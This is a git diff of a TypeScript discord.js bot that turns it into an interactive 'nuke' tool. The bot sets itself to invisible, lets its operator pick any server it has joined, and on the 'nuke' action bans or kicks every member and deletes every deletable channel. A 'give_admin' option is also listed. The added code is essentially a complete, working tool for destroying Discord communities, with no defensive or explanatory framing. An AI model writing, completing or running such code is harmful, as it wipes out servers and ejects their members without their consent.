@@ -1,38 +1,8 @@
 import { Client, Guild } from "discord.js"
-import * as fs from "fs";
 import { config } from "dotenv"
-import { CommandRegistry } from "./commands.js";
+import inquirer from "inquirer"
 config({
     quiet: true
-})
-
-const CONFIG_PATH = "./config.json"
-let botConfig: { whitelistedGuilds: string[]; }
-
-if(fs.existsSync(CONFIG_PATH)) {
-    botConfig = JSON.parse(fs.readFileSync("./config.json", "utf-8").toString());
-
-    if(!botConfig.whitelistedGuilds || !Array.isArray(botConfig.whitelistedGuilds)) {
-        throw new Error("Invalid config.")
-    }
-} else {
-    throw new Error("No config.")
-}
-
-var CURRENT_TARGET: Guild | undefined;
-
-CommandRegistry.registerCommand({
-    name: "target",
-    description: "targets a server",
-    run: (message, guild)=>{
-        const fetched = client.guilds.fetch(guild);
-
-        if(fetched) {
-
-        } else {
-
-        }
-    }
 })
 
 const client = new Client({
@@ -47,29 +17,85 @@ const client = new Client({
 })
 
 client.on("clientReady", async()=>{
-    client.user?.setStatus("invisible")
+    client.user?.setStatus("invisible");
 })
 
-client.on("messageCreate", async(message)=>{
-    if(message.author.id == client.user?.id) return;
-    if(botConfig.whitelistedGuilds.includes(message.guildId ?? `user-${message.author.id}`)) {
-        const args = message.content.split(" ");
-        const cmd = args.shift();
+await client.login(process.env.TOKEN);
 
-        if(!cmd) {
-            message.reply("invalid command.");
-            return;
+const guilds = await client.guilds.fetch();
+
+while(true) {
+    const answers = await inquirer.prompt([
+        {
+            type: "search",
+            name: "select_guild",
+            message: "Select Guild",
+            source: async (term) => {
+                const query = term?.toLowerCase() ?? "";
+
+                return guilds.filter((g) =>
+                    g.name.toLowerCase().includes(query)
+                ).map((g) => ({
+                    name: g.name,
+                    value: g.id,
+                }));
+            }
         }
+    ]);
 
-        const command = CommandRegistry.getCommand(cmd);
+    const guild = await guilds.find(g => g.id == answers.select_guild)?.fetch();
 
-        if(command) {
-            const commandResult = await command.run(message, ...args);
-            if(commandResult) message.reply(commandResult);
-        } else {
-            message.reply(`command "${cmd}" not found.`)
+    if(guild) {
+        const choice = await inquirer.prompt([
+            {
+                type: "select",
+                name: "action",
+                message: "Action",
+                choices: [
+                    "nuke",
+                    "give_admin",
+                    "leave",
+                    "back"
+                ]
+            }
+        ]);
+
+        
+        if (choice.action === "nuke") {
+            const members = await guild.members.fetch();
+
+            const targets = members.filter(
+                member => member.id !== client.user?.id
+            );
+
+            for(const target of targets) {
+                if(target[1].bannable) {
+                    await target[1].ban();
+                    console.log(`banned ${target[1].displayName}`)
+                } else if(target[1].kickable) {
+                    await target[1].kick();
+                    console.log(`kicked ${target[1].displayName}`)
+                } else {
+                    console.log(`failed to ban or kick ${target[1].displayName}`)
+                }
+            }
+
+            console.log("banned users");
+
+            const channels = await guild.channels.fetch();
+
+            for(const channel of channels) {
+                if(channel[1]?.deletable) {
+                    channel[1]?.delete();
+                    console.log(`kicked ${channel[1].name}`)
+                } else {
+                    
+                }
+            }
+
+            console.log("deleted channels");
         }
+    } else {
+        console.error("invalid guild");
     }
-})
-
-client.login(process.env.TOKEN)
+}
